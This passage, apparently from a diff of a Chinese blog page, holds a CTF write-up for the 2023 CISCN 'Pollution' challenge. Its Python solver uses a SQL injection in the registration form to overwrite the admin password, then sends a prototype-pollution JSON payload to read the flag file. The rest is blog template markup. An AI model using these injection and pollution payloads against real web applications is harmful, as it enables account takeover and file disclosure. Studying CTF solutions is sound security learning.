class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">![<span class="hljs-number">2</span>](images/<span class="hljs-number">2.</span>png)<span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib <span class="hljs-keyword">as</span> md5<br><span class="hljs-keyword">import</span> json<br><br>s=requests.session()<br>url=<span class="hljs-string">&quot;http://127.0.0.1&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SQLinjection</span>(<span class="hljs-params">url</span>):<br>    url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/register&#x27;</span><br>    passwd=<span class="hljs-string">&#x27;123456&#x27;</span><br>    <span class="hljs-built_in">hash</span>=passwd.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>    data=&#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">f&quot;admin&#x27;,&#x27;<span class="hljs-subst">&#123;md5.md5(<span class="hljs-built_in">hash</span>).hexdigest()&#125;</span>&#x27;) on CONFLICT DO UPDATE SET password=&#x27;<span class="hljs-subst">&#123;md5.md5(<span class="hljs-built_in">hash</span>).hexdigest()&#125;</span>&#x27; --+&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>    res=s.post(url=url,data=data)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span> :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;injected successfully!\n&quot;</span>,res.content)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;injected failed&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url=<span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>    SQLinjection(url)<br><br><span class="hljs-comment">#忘记写登录的逻辑了</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Login</span>(<span class="hljs-params">url</span>):<span class="hljs-comment">#获取登录session</span><br>    url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/login&#x27;</span><br>    data=&#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>    res=s.post(url=url,data=data)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Login successful&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Login failed&quot;</span>)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pollution</span>(<span class="hljs-params">url</span>):<br>    url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/admin&#x27;</span><br>    data=&#123;<span class="hljs-string">&quot;constructor&quot;</span>:&#123;<span class="hljs-string">&quot;prototype&quot;</span>:&#123;<span class="hljs-string">&quot;path&quot;</span>:<span class="hljs-string">&quot;/Users/sammy/Desktop/临时题目文件夹/pollute/flag.txt&quot;</span>&#125;&#125;<br>    &#125;<br>    data=json.dumps(data)<br>    res=s.post(url=url,data=data,headers=&#123;<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span>&#125;)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;polluted successfully\n&quot;</span>,res.content)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;polluted failed\n&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    SQLinjection(url)<br>    Login(url)<br>    pollution(url)<br></code></pre></td></tr></table></figure>
+
+<p>获得flag</p>
+<p><img src="/img/2023ciscn/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>参考文章：kento师傅的复现wp</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023_CISCN_Pollution</div>
+      <div>https://sammylingsj.github.io/2023/06/24/2023CISCN/2023_CISCN_Pollution/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>s4mmy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/28/D%5E3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/D%5E3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/" title="D^3 CTF 2021 8-bit pub复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">D^3 CTF 2021 8-bit pub复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>s4mmy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
